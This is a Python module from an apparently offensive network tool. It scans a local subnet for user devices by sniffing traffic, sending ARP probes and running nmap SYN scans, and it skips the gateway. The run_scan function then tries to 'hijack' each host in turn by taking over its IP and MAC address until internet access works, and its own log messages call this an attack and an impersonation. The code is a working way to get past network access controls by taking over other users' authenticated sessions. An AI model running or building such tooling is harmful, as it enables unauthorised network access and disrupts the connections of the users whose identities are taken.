"""
Library/scanner.py - Layer 2 ARP network enumeration and network auto-detection.
"""

import ipaddress
import logging
import os
import re
import shutil
import sys
import time

# Suppress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from .utils import (
    _run,
    log_info,
    log_plus,
    log_warning,
    log_minus,
    log_scan,
    log_main,
    set_restore_params,
    register_signal_handler,
    ask_proceed,
    ask_restore
)
from .adapter import (
    hijack,
    restore,
    has_internet
)


def nmap_scan_subnet(subnet_cidr, interface):
    """
    Executes a fast Nmap TCP SYN probe scan targeting common user ports
    to discover firewalled user endpoints.
    Returns list of dicts: [{'ip': ip, 'mac': mac}, ...]
    """
    if not shutil.which("nmap"):
        return []

    cmd = [
        "nmap", "-PN", "-sS",
        "-p", "80,443,8080,22,445,139,3389,8000,8888,5353",
        "--min-rate", "300",
        "-n", "-e", interface,
        str(subnet_cidr)
    ]
    rc, out = _run(cmd, debug=False)
    if rc != 0 or not out:
        return []

    discovered = {}
    current_ip = None

    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Nmap scan report for "):
            ip_m = re.search(r"Nmap scan report for\s+(\S+)", line)
            if ip_m:
                current_ip = ip_m.group(1)
        elif "MAC Address:" in line and current_ip:
            mac_m = re.search(r"MAC Address:\s+([0-9a-fa-f:]+)", line, re.IGNORECASE)
            if mac_m:
                mac = mac_m.group(1).lower()
                discovered[current_ip] = mac

    return [{"ip": ip, "mac": mac} for ip, mac in discovered.items()]


def deep_scan_subnet(subnet_cidr, interface, gateway_ip=None, gateway_mac=None, local_ip=None, local_mac=None, duration=30):
    """
    Combines:
    1. 30-second passive traffic sniffing
    2. Active Scapy ARP scan
    3. Fast Nmap TCP SYN user endpoint scan
    Filters out local host and router/gateway infrastructure to return ONLY user devices.
    """
    hosts_map = {}

    # Phase 1: Passive traffic capture
    passive_hosts = passive_sniff_subnet(subnet_cidr, interface, duration=duration)
    for h in passive_hosts:
        hosts_map[h["ip"]] = h["mac"]

    # Phase 2: Active Scapy ARP scan
    active_hosts = scan_subnet(subnet_cidr, interface)
    for h in active_hosts:
        hosts_map[h["ip"]] = h["mac"]

    # Phase 3: Nmap user endpoint scan
    nmap_hosts = nmap_scan_subnet(subnet_cidr, interface)
    for h in nmap_hosts:
        hosts_map[h["ip"]] = h["mac"]

    # Phase 4: Filter out Gateway & Local Host (User Devices Only)
    user_hosts = []
    gw_ip_clean = (gateway_ip or "").strip()
    gw_mac_clean = (gateway_mac or "").strip().lower()
    local_ip_clean = (local_ip or "").strip()
    local_mac_clean = (local_mac or "").strip().lower()

    for ip, mac in hosts_map.items():
        mac_lower = mac.lower()
        if gw_ip_clean and ip == gw_ip_clean:
            continue
        if gw_mac_clean and mac_lower == gw_mac_clean:
            continue
        if local_ip_clean and ip == local_ip_clean:
            continue
        if local_mac_clean and mac_lower == local_mac_clean:
            continue
        user_hosts.append({"ip": ip, "mac": mac})

    return user_hosts


def resolve_mac_to_ip(target_mac, interface, target_subnet=None):
    """
    Guaranteed multi-stage IP resolution for a target MAC address:
    1. Inspects Linux kernel neighbor table (`ip neighbor`) and `/proc/net/arp`
    2. Short 3-second passive multicast & broadcast traffic listener (captures mDNS, LLMNR, SSDP, DHCP, ARP)
    3. Active Layer 3 unicast ping/port sweep (via nmap/ping) to route IP packets through AP and populate kernel ARP table
    4. Active Scapy ARP scan fallback
    """
    if not target_mac:
        return None

    mac_clean = target_mac.strip().lower()

    if not target_subnet:
        params = auto_detect_network_params(target_iface=interface)
        if params.get("cidr"):
            target_subnet = params["cidr"]
        elif params.get("local_ip"):
            target_subnet = f"{params['local_ip']}/24"
        elif params.get("gateway_ip"):
            target_subnet = f"{params['gateway_ip']}/24"

    # Stage 1: Inspect kernel neighbor cache & /proc/net/arp
    def check_kernel_cache():
        rc, out = _run(["ip", "neighbor", "show", "dev", interface], debug=False)
        if out:
            for line in out.splitlines():
                if mac_clean in line.lower():
                    parts = line.split()
                    if len(parts) >= 1:
                        try:
                            ip_obj = ipaddress.ip_address(parts[0])
                            return str(ip_obj)
                        except ValueError:
                            pass

        if os.path.exists("/proc/net/arp"):
            try:
                with open("/proc/net/arp", "r") as f:
                    for line in f.readlines()[1:]:
                        parts = line.split()
                        if len(parts) >= 4 and parts[3].lower() == mac_clean:
                            try:
                                return str(ipaddress.ip_address(parts[0]))
                            except ValueError:
                                pass
            except Exception:
                pass
        return None

    ip_found = check_kernel_cache()
    if ip_found:
        return ip_found

    # Stage 2: Passive Multicast / Broadcast Traffic Listener (3 seconds)
    try:
        from scapy.all import sniff, Ether, IP, ARP, BOOTP
        sniffed_ip = [None]

        def passive_mac_callback(pkt):
            if sniffed_ip[0]:
                return
            src_mac = None
            src_ip = None

            if pkt.haslayer(Ether):
                src_mac = pkt[Ether].src.lower()
            elif pkt.haslayer(ARP):
                src_mac = pkt[ARP].hwsrc.lower()

            if src_mac == mac_clean:
                if pkt.haslayer(ARP):
                    src_ip = str(pkt[ARP].psrc)
                elif pkt.haslayer(IP):
                    src_ip = str(pkt[IP].src)
                elif BOOTP and pkt.haslayer(BOOTP):
                    bootp = pkt[BOOTP]
                    if hasattr(bootp, "ciaddr") and str(bootp.ciaddr) not in ("0.0.0.0", "255.255.255.255"):
                        src_ip = str(bootp.ciaddr)
                    elif hasattr(bootp, "yiaddr") and str(bootp.yiaddr) not in ("0.0.0.0", "255.255.255.255"):
                        src_ip = str(bootp.yiaddr)

                if src_ip and src_ip not in ("0.0.0.0", "255.255.255.255"):
                    sniffed_ip[0] = src_ip

        sniff(iface=interface, timeout=3, prn=passive_mac_callback, store=False)
        if sniffed_ip[0]:
            return sniffed_ip[0]
    except Exception:
        pass

    # Stage 3: Active Layer 3 Unicast Sweep to force kernel neighbor population
    if target_subnet:
        try:
            net_obj = ipaddress.ip_network(target_subnet, strict=False)
            sweep_target = str(net_obj)
            if net_obj.prefixlen < 24:
                sweep_target = f"{net_obj.network_address}/24"

            if shutil.which("nmap"):
                cmd = [
                    "nmap", "-sn", "-PE", "-PS80,443,8080,53", "-PU53,137,5353",
                    "--min-rate", "400", "-n", "-e", interface, sweep_target
                ]
                _run(cmd, debug=False)
            else:
                import socket
                import concurrent.futures

                def probe_ip(ip_str):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.settimeout(0.05)
                        s.sendto(b"\x00", (ip_str, 80))
                        s.close()
                    except Exception:
                        pass

                hosts_list = list(net_obj.hosts())[:254]
                with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                    executor.map(probe_ip, [str(h) for h in hosts_list])
        except Exception:
            pass

        # Re-check kernel cache after Layer 3 sweep
        ip_found = check_kernel_cache()
        if ip_found:
            return ip_found

    # Stage 4: Trigger ARP resolution scan fallback
    if target_subnet:
        hosts = scan_subnet(target_subnet, interface)
        for h in hosts:
            if h["mac"].lower() == mac_clean:
                return h["ip"]

    return None


def auto_detect_network_params(target_iface=None):
    """
    Auto-detects default network interface, local IP, MAC, gateway, netmask,
    broadcast, wireless SSID, and router MAC.
    """
    info = {
        "interface": target_iface,
        "local_ip": None,
        "local_mac": None,
        "gateway_ip": None,
        "gateway_mac": None,
        "broadcast": None,
        "cidr": None,
        "ssid": None,
        "internet_access": False
    }

    # 1. Default interface & Gateway IP
    rc, route_out = _run(["ip", "-o", "-4", "route", "show", "to", "default"])
    if route_out:
        gw_match = re.search(r"via\s+(\S+)", route_out)
        dev_match = re.search(r"dev\s+(\S+)", route_out)
        if gw_match:
            info["gateway_ip"] = gw_match.group(1)
        if dev_match and not info["interface"]:
            dev_name = dev_match.group(1)
            if not any(dev_name.startswith(prefix) for prefix in ("br-", "veth", "docker", "lo", "lxc")):
                info["interface"] = dev_name

    if not info["interface"]:
        rc, link_out = _run(["ip", "-o", "link", "show"])
        for line in link_out.splitlines():
            if "state UP" in line and "LOOPBACK" not in line:
                parts = line.split(":", 2)
                if len(parts) >= 2:
                    iface_name = parts[1].strip()
                    if not any(iface_name.startswith(prefix) for prefix in ("br-", "veth", "docker", "lo", "lxc")):
                        info["interface"] = iface_name
                        break

    if not info["interface"]:
        info["interface"] = "wlan0"

    # 2. IP, netmask/CIDR, broadcast
    rc, addr_out = _run(["ip", "-o", "-4", "addr", "show", "dev", info["interface"]])
    if addr_out:
        ip_match = re.search(r"inet\s+(\S+)", addr_out)
        brd_match = re.search(r"brd\s+(\S+)", addr_out)
        if ip_match:
            info["cidr"] = ip_match.group(1)
            info["local_ip"] = info["cidr"].split("/")[0]
        if brd_match:
            info["broadcast"] = brd_match.group(1)

    # 3. Local MAC
    rc, mac_out = _run(["ip", "-0", "addr", "show", "dev", info["interface"]])
    if mac_out:
        mac_match = re.search(r"link/ether\s+([0-9a-fa-f:]+)", mac_out, re.IGNORECASE)
        if mac_match:
            info["local_mac"] = mac_match.group(1).lower()

    # 4. Wi-Fi SSID
    rc, iw_out = _run(["iw", "dev", info["interface"], "link"])
    if rc == 0 and iw_out:
        ssid_match = re.search(r"SSID:\s*(.*)", iw_out)
        if ssid_match:
            info["ssid"] = ssid_match.group(1).strip()

    # 5. Gateway MAC
    if info["gateway_ip"]:
        rc, neigh_out = _run(["ip", "neighbor", "show", info["gateway_ip"], "dev", info["interface"]])
        if neigh_out:
            gw_mac_m = re.search(r"lladdr\s+([0-9a-fa-f:]+)", neigh_out, re.IGNORECASE)
            if gw_mac_m:
                info["gateway_mac"] = gw_mac_m.group(1).lower()

    # 6. Check internet access
    info["internet_access"] = has_internet()

    return info


def get_interface_details(interface):
    """Retrieves local IP and MAC address safely."""
    try:
        from scapy.all import get_if_addr, get_if_hwaddr
    except ImportError:
        log_scan("[-] scapy is required for scanning. Install with: pip install scapy")
        sys.exit(1)

    try:
        local_ip = get_if_addr(interface)
        local_mac = get_if_hwaddr(interface)
        return local_ip, local_mac
    except Exception as e:
        log_scan(f"[-] Error reading interface {interface}: {e}")
        sys.exit(1)


def scan_subnet(subnet_cidr, interface):
    """
    Sends ARP requests to a target subnet chunk.
    Returns a list of dicts with active IPs and MACs.
    """
    try:
        from scapy.all import Ether, ARP, srp
    except ImportError:
        log_scan("[-] scapy is required for subnet scanning. Install with: pip install scapy")
        sys.exit(1)

    arp_req = ARP(pdst=str(subnet_cidr))
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_req

    alive_hosts = []
    try:
        answered, _ = srp(packet, timeout=2, iface=interface, verbose=False)
        for sent, received in answered:
            alive_hosts.append({"ip": received.psrc, "mac": received.hwsrc})
    except PermissionError:
        log_scan("[-] Permission denied. Root privileges required to send raw packets.")
        sys.exit(1)

    return alive_hosts


def passive_sniff_subnet(subnet_cidr, interface, duration=30):
    """
    Passively sniffs traffic on the interface for `duration` seconds.
    Extracts source IP and MAC addresses from background broadcast/multicast/ARP/IP traffic.
    """
    try:
        from scapy.all import sniff, IP, ARP, Ether
    except ImportError:
        log_scan("[-] scapy is required for passive sniffing. Install with: pip install scapy")
        return []

    log_scan(f"Passively sniffing traffic on {interface} ({duration}s)...")
    try:
        target_net = ipaddress.ip_network(str(subnet_cidr), strict=False)
    except ValueError:
        return []

    discovered = {}

    def packet_callback(pkt):
        src_ip = None
        src_mac = None

        if pkt.haslayer(ARP):
            arp_layer = pkt[ARP]
            src_ip = arp_layer.psrc
            src_mac = arp_layer.hwsrc
        elif pkt.haslayer(IP):
            ip_layer = pkt[IP]
            src_ip = ip_layer.src
            if pkt.haslayer(Ether):
                src_mac = pkt[Ether].src

        if src_ip and src_mac:
            src_mac = src_mac.lower()
            if src_ip in ("0.0.0.0", "255.255.255.255") or src_mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"):
                return
            if src_mac.startswith("01:00:5e") or src_mac.startswith("33:33"):
                return

            try:
                ip_obj = ipaddress.ip_address(src_ip)
                if ip_obj in target_net and not ip_obj.is_multicast and not ip_obj.is_loopback:
                    if src_ip not in discovered:
                        discovered[src_ip] = src_mac
            except ValueError:
                pass

    try:
        sniff(iface=interface, timeout=duration, prn=packet_callback, store=False)
    except Exception as e:
        log_scan(f"[-] Passive sniffing exception on {interface}: {e}")

    log_scan(f"Passive sniff complete: Found {len(discovered)} active host(s).")
    return [{"ip": ip, "mac": mac} for ip, mac in discovered.items()]


def run_scan(args, quiet_header=False):
    """Main subcommand handler for ARP scan & host takeover."""
    register_signal_handler()

    interface = getattr(args, "interface", None) or "wlan0"
    auto_params = auto_detect_network_params(target_iface=interface)
    local_ip, local_mac = get_interface_details(interface)

    subnet_arg = getattr(args, "subnet", None)
    target_arg = getattr(args, "target", None)
    target_str = subnet_arg or target_arg
    is_deep = bool(subnet_arg)

    if not target_str and auto_params["cidr"]:
        try:
            net_obj = ipaddress.ip_network(auto_params["cidr"], strict=False)
            target_str = str(net_obj)
        except ValueError:
            target_str = auto_params["cidr"]

    if not target_str:
        log_scan("[-] Could not auto-detect target network subnet CIDR.")
        sys.exit(1)

    log_scan(f"=== SUBNET SCANNER ({target_str}) ===", clear=True)

    try:
        network = ipaddress.ip_network(target_str, strict=False)
    except ValueError as e:
        log_scan(f"[-] Invalid target network string: {e}")
        sys.exit(1)

    if network.prefixlen < 24:
        subnets = list(network.subnets(new_prefix=24))
        log_scan(f"Large target subnet ({network}): Split into {len(subnets)} /24 blocks.")
    else:
        subnets = [network]

    gw_ip = auto_params.get("gateway_ip", "")
    gw_mac = auto_params.get("gateway_mac", "")
    netmask = auto_params.get("cidr", "").split("/")[1] if auto_params.get("cidr") and "/" in auto_params.get("cidr") else "24"
    broadcast = auto_params.get("broadcast", "")
    ipmask = auto_params.get("cidr", f"{local_ip}/{netmask}")

    set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore)

    # Initial internet check
    if auto_params.get("internet_access"):
        if not getattr(args, "force", False):
            log_scan("[+] Internet access is already active on current connection!")
            log_main("[+] Internet access is already active on current connection!")
            return True
        else:
            log_scan("[!] Internet access is active, but --force is enabled. Continuing scan...")
            log_main("[!] Internet access is active, but --force is enabled. Continuing scan...")

    discovered_devices = []
    try:
        for sub in subnets:
            log_scan(f"\n--- Scanning Subnet Block {sub} ---", clear=True)
            if is_deep:
                hosts = deep_scan_subnet(sub, interface, gateway_ip=gw_ip, gateway_mac=gw_mac, local_ip=local_ip, local_mac=local_mac, duration=30)
            else:
                hosts = scan_subnet(sub, interface)

            # Deduplicate & filter local host
            unique_hosts = []
            seen_ips = set()
            for h in hosts:
                if h["ip"] == local_ip:
                    continue
                if h["ip"] not in seen_ips:
                    seen_ips.add(h["ip"])
                    unique_hosts.append(h)

            if unique_hosts:
                log_scan(f"[+] Discovered {len(unique_hosts)} active host(s) on block {sub}:")
                for host in unique_hosts:
                    tag = ""
                    if gw_ip and host["ip"] == gw_ip:
                        tag = " [GATEWAY IP]"
                    elif gw_mac and host["mac"].lower() == gw_mac.lower():
                        tag = " [GATEWAY MAC]"
                    log_scan(f"  -> {host['ip']:<15} {host['mac']}{tag}")
                    discovered_devices.append(host)

                # Attempt takeover
                log_scan("Testing discovered hosts for internet access...")
                for host in unique_hosts:
                    is_gw = (gw_ip and host["ip"] == gw_ip) or (gw_mac and host["mac"].lower() == gw_mac.lower())
                    if not is_gw:
                        hijack_success = hijack(interface, host['ip'], host['mac'], netmask, broadcast, gw_ip)
                        if hijack_success:
                            log_scan("[+] SUCCESS! Internet access established!")
                            log_main(f"\033[92m[+] SUCCESS! Internet access established via {host['ip']} ({host['mac']})!\033[0m")
                            if not getattr(args, "force", False):
                                return True

                        if getattr(args, "force", False):
                            if not ask_proceed():
                                log_warning("User requested to stop attack after impersonation.")
                                log_scan("[-] User requested to stop attack after impersonation.")
                                has_acc = hijack_success or has_internet()
                                if ask_restore(default_restore=not has_acc):
                                    restore(interface, local_mac, ipmask, broadcast, gw_ip)
                                else:
                                    log_plus("Keeping current MAC and network configuration.")
                                return has_acc

                        time.sleep(0.5)
            else:
                log_scan(f"[Info] No active user hosts found on block {sub}.")

    except KeyboardInterrupt:
        from .utils import restore_and_exit
        restore_and_exit("Ctrl+C received during scan.")

    log_scan(f"\n[+] Scan complete. Total Discovered Hosts: {len(discovered_devices)}")
    has_acc = has_internet()
    if getattr(args, "force", False):
        if ask_restore(default_restore=not has_acc):
            restore(interface, local_mac, ipmask, broadcast, gw_ip)
        else:
            log_plus("Keeping current MAC and network configuration.")
    else:
        if not has_acc:
            restore(interface, local_mac, ipmask, broadcast, gw_ip)
        else:
            log_plus("Internet verified. Preserving working MAC and network configuration.")
    return has_acc





